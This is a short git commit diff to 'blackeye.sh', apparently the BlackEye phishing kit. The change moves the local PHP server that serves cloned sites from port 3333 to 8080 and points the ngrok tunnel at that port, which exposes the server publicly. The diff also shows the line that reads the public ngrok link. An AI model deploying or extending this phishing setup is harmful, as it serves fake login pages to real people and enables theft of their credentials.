f5534630870f5b2e9a7044f9f58485aacfc609e0
azam23991 <shitmambang@gmail.com>
2023-02-12 06:14:20 +0800

    :~ #cm blackeye :~ #bash blackeye.sh

--- blackeye.sh
+++ blackeye.sh
@@ -415,10 +415,10 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 8080 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
